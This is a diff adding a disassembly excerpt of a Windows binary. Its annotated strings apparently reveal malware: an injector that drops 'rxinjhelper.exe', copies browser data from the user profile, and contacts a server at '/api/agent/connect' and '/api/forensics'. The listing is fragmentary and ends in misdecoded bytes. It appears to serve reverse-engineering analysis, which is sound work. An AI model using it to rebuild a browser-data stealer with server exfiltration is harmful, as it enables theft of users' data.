@@ -1,0 +1,73 @@
+   140014d3e:	lea    rax,[rip+0x2158b]        # 0x1400362d0   "UVH..HH.l$@H..H..H.U...b.......H).H..H...H.L$(H."
+   140014d50:	lea    rdx,[rip+0x255d29]        # 0x14026aa80   ".[HTTP:.$] Preparing forensics transmission (.. "
+   140014daf:	lea    rax,[rip+0x255d12]        # 0x14026aac8   "..&@............/api/forensics....&@............"
+   140014dbe:	lea    rax,[rip+0x9f378]        # 0x1400b413d   "H..H..L.A.H...1y..VWSH......H..H.\$ .(...1.H...."
+   140014dcd:	lea    rcx,[rip+0x255d14]        # 0x14026aae8   "..&@.............https://....[HTTP:..] Server UR"
+   140014de7:	lea    rdx,[rip+0x255d0a]        # 0x14026aaf8   ".https://....[HTTP:..] Server URL: ..GET./api/ag"
+   140014e41:	lea    rdx,[rip+0x255cbc]        # 0x14026ab04   ".[HTTP:..] Server URL: ..GET./api/agent/connect."
+   140014edf:	mov    r9d,0x2
+   140014f06:	lea    rcx,[rip+0xf4e5e]        # 0x140109d6b   "Failed to generate random key seed.Failed to bui"
+   140014f1a:	lea    r15,[rip+0x257da7]        # 0x14026ccc8   "p..@.................... ..@....`..@......&@...."
+   140014f29:	lea    rbx,[rip+0x1a470]        # 0x14002f3a0   "UVWSH..HH.l$@..A.....H....(.A........rUA.Y...A.."
+   140014f98:	mov    r8d,0x20
+   140015017:	lea    rax,[rip+0x2c52ba]        # 0x1402da2d8   "..-@....u...........;.....-@....u...........G..."
+   140015023:	mov    r9d,0x20
+   14001519b:	mov    r8d,0x20
+   1400151b1:	mov    r8d,0x1d
+   1400151ba:	lea    r12,[rip+0x25595c]        # 0x14026ab1d   "GET./api/agent/connect.nonce.1.msg_.._..message_"
+   14000759d:	lea    rdx,[rip+0x10300f]        # 0x14010a5b3   "rxinjhelper.exeMZ......................@........"
+   1400075ac:	mov    r8d,0x5
+   14000760c:	mov    r9d,0x15b800
+   14000763c:	lea    rdx,[rip+0x25e77f]        # 0x140265dc2   "[INJECTOR] extracted helper.exe-fall.[INJECTOR] "
+   140007643:	mov    r8d,0x1f
+   140007659:	lea    rax,[rip+0x1fc3d]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   140007664:	lea    rcx,[rip+0x102792]        # 0x140109dfd   ".[INFO] ......_...zip..[DEBUG:FAST] [T=..s] Crea"
+   140007692:	lea    rdx,[rip+0x25e748]        # 0x140265de1   "-fall.[INJECTOR] PID .. running (timeout 90s)..."
+   140007699:	mov    r8d,0x2
+   1400076a7:	lea    rdx,[rip+0x25e735]        # 0x140265de3   "all.[INJECTOR] PID .. running (timeout 90s)....["
+   1400076ae:	mov    r8d,0x3
+   140007765:	lea    rax,[rip+0x27c34]        # 0x14002f3a0   "UVWSH..HH.l$@..A.....H....(.A........rUA.Y...A.."
+   140007770:	lea    rdx,[rip+0x25e66f]        # 0x140265de6   ".[INJECTOR] PID .. running (timeout 90s)....[INJ"
+   140007785:	lea    rax,[rip+0x1fb11]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   140007790:	lea    rcx,[rip+0x102666]        # 0x140109dfd   ".[INFO] ......_...zip..[DEBUG:FAST] [T=..s] Crea"
+   140007850:	lea    rax,[rip+0x1f360]        # 0x140026bb7   "H..8.9.u6H...L.L$0I..H......H.D$ H....+.A.....H."
+   14000785b:	lea    rdx,[rip+0x25e5d6]        # 0x140265e38   ".[INJECTOR] exit status: ..[INJECTOR] exited cle"
+   140007870:	lea    rax,[rip+0x1fa26]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   14000787b:	lea    rcx,[rip+0x1020a1]        # 0x140109923   ".[WARN] .....[ERROR] .....Failed to canonicalize"
+   1400078a4:	lea    rdx,[rip+0x25e567]        # 0x140265e12   "[INJECTOR] timeout after 90s -- killed.[INJECTOR"
+   1400078ab:	mov    r8d,0x26
+   1400078c1:	lea    rax,[rip+0x1f9d5]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   1400078cc:	lea    rcx,[rip+0x102050]        # 0x140109923   ".[WARN] .....[ERROR] .....Failed to canonicalize"
+   1400078eb:	lea    rdx,[rip+0x25e561]        # 0x140265e53   "[INJECTOR] exited cleanlyoutput[INJECTOR] copied"
+   1400078f2:	mov    r8d,0x19
+   140007908:	lea    rax,[rip+0x1f98e]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   140007913:	lea    rcx,[rip+0x1024e3]        # 0x140109dfd   ".[INFO] ......_...zip..[DEBUG:FAST] [T=..s] Crea"
+   1400079e4:	lea    r13,[rip+0x265015]        # 0x14026ca00   ".3.@....................@G.@....pU.@......&@...."
+   140007a0a:	lea    rax,[rip+0x1f87b]        # 0x14002728c   "H..H.I.L.A H..I..H..H.Q.L.A.H....G..VWH..(H..H.."
+   140007a15:	lea    rdx,[rip+0x1023a6]        # 0x140109dc2   ".[INJECTOR] ..Z........[DEBUG:FAST] Sleeping .. "
+   140007a2a:	lea    rax,[rip+0x1f86c]        # 0x14002729d   "H..H.Q.L.A.H....G..VWH..(H..H..H.R.L.F...'...F.."
+   140007a35:	lea    rcx,[rip+0x101ef3]        # 0x14010992f   ".[ERROR] .....Failed to canonicalize source '..'"
+   140007a87:	lea    rdx,[rip+0x25e3e4]        # 0x140265e72   "[INJECTOR] copied browser data to outputUSERPROF"
+   140007a8e:	mov    r8d,0x28
+   140019d33:	lea    rdx,[rip+0xf086a]        # 0x14010a5a4   "BRIDGE_LOCAL_IPrxinjhelper.exeMZ................"
+   140019d3a:	lea    rsi,[rsp+0x140]
+   140019d42:	mov    r8d,0xf
+   140019d48:	mov    rcx,rsi
+   140019d4b:	call   0x1400d65b0
+   140019d50:	mov    rsi,QWORD PTR [rsi]
+   140019d53:	cmp    rsi,0xfffffffffffffffe
+   140019d57:	jne    0x140019d74
+   140019d59:	lea    rax,[rsp+0x148]
+   140019d61:	mov    rcx,QWORD PTR [rax+0x10]
+   140019d65:	mov    QWORD PTR [r12+0x10],rcx
+   140019d6a:	movups xmm0,XMMWORD PTR [rax]
+   140019d6d:	movups XMMWORD PTR [r12],xmm0
+   140019d72:	jmp    0x140019d9d
+   140019d74:	mov    rdi,QWORD PTR [rsp+0x148]
+   140019d7c:	lea    rdx,[rip+0xefdf6]        # 0x140109b79   "0.0.0.0USERPROFILE not found Failed to create te"
+   140019d83:	mov    r8d,0x7
+   140019d89:	mov    rcx,r12
+   140019d8c:	.byte 0xe8
+   140019d8d:	iret
+   140019d8e:	cld
+   140019d8f:	.byte 0xfe
